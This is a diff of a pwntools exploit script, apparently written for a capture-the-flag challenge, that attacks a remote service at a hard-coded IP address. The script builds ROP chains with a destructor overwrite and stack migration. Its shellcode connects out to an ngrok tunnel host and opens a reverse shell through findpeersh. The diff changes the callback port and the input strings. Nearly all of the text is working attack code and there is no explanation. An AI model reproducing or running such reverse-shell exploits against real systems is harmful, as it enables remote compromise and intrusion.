@@ -14,12 +14,12 @@ p = remote('143.198.127.103', 42009)
 #funcs
 
 def add(x, y):
-    p.sendlineafter('?', '1')
+    p.sendlineafter('?', '1 go!')
     p.sendlineafter('?', str(x))
     p.sendlineafter('?', str(y - 1))
 
 def chg(x, s):
-    p.sendlineafter('?', '3')
+    p.sendlineafter('?', '3 go!')
     p.sendlineafter('?', str(x))
     p.sendlineafter('?', s)
 
@@ -53,8 +53,8 @@ arena_off = 0x1bebe0
 mprotect_off = libc.sym['mprotect']
 
 shellcode = shellcraft.open('/dev/pts/0')
-shellcode += shellcraft.connect('8.tcp.ngrok.io', 12364)
-shellcode += shellcraft.findpeersh(12364)
+shellcode += shellcraft.connect('8.tcp.ngrok.io', 17942)
+shellcode += shellcraft.findpeersh(17942)
 
 log.info('Csu adr: ' + hex(csu))
 log.info('Dtor adr: ' + hex(dtor))
@@ -102,6 +102,7 @@ rop = ROP(e)
 for i in range(0, len(s) - 0x4, 4):
     ret2dtor(arr + i, u32(s[i:i + 0x4])) #write 2nd rop
 
+#rop.call(e.plt['_exit'], [1])
 rop.migrate(arr) #call 2nd rop
 
 #log.info('Rop 1:\n' + rop.dump())
@@ -110,6 +111,7 @@ log.info('Rop 1 len: ' + hex(len(rop.dump())))
 s = b'5'
 s = s.ljust(0x38, b'\x00')
 s += rop.chain()
+s += b' go!'
 
 p.sendlineafter('?', s)
 
